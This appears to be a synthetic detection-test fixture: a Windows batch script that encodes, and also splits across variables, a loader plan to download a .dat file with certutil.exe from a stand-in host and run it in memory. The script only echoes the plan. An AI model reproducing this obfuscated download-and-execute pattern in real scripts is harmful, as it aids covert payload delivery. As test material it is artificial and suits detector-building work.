@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:decimal_bytes|add_7
rem HUNTRESS-MATERIAL:125.68.56.131.122.123.108.119.122.68.104.106.120.124.112.121.108.102.121.108.116.118.123.108.51.107.112.122.119.104.123.106.111.102.116.108.116.118.121.128.131.104.107.104.119.123.108.121.68.106.108.121.123.124.123.112.115.53.108.127.108.131.122.123.104.110.108.102.106.118.124.117.123.68.56.131.110.121.104.119.111.68.106.121.118.122.122.102.115.104.117.110.124.104.110.108.131.117.108.127.123.102.115.104.117.110.124.104.110.108.68.117.118.117.108.131.106.104.116.119.104.112.110.117.102.112.107.68.106.104.116.119.104.112.110.117.52.105.57.63.55.108.64.61.59.106.108.131.124.121.115.68.111.123.123.119.122.65.54.54.105.57.63.55.108.64.61.59.106.108.53.108.127.104.116.119.115.108.53.112.117.125.104.115.112.107.54.106.56.62.57.105.58.104.56.53.107.104.123
rem analyst reconstruction fixture
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "item0=v=1|steps=acquire_remote,dispatch_memory|adapter=c"& rem HUNTRESS quote compound
set "item1=ertutil.exe|stage_count=1|graph=cross_language|nex"& rem HUNTRESS quote compound
set "item2=t_language=none|campaign_id=campaign-b280e964ce|ur"& rem HUNTRESS quote compound
set "item3=l=https://b280e964ce.example.invalid/c172b3a1.dat"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_environment_probe=36f78205"
goto :HUNTRESS_DISPATCH
:HUNTRESS_DISPATCH
set "item9=%item0%%item1%%item2%%item3%"
echo(!item9!
exit /b 0
:HUNTRESS_PLAN
echo certutil.exe GET https://b280e964ce.example.invalid/c172b3a1.dat then dispatch memory
exit /b 0
